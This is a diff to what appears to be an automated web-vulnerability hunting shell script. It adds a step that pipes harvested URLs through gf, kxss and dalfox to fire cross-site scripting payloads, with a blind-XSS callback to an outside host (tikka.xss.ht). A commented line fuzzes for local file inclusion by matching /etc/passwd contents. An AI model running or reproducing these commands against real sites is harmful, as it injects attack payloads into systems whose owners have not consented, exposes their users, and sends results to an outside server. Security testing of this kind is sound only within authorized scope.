@@ -96,6 +96,9 @@ cat /root/Projects/$domain/sorted_subdomain.txt | httpx | python3  /root/Tools/s
 
 #cat /root/Projects/$domain/All_Urls.txt |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w /root/el_cazador/LFI.txt ; done
 
+echo -e "\n Checking for XSS"
+
+cat All_Urls.txt | httprobe | httpx |gf xss | kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b https://tikka.xss.ht
 
 echo -e "\n Checking for SQLI"
 
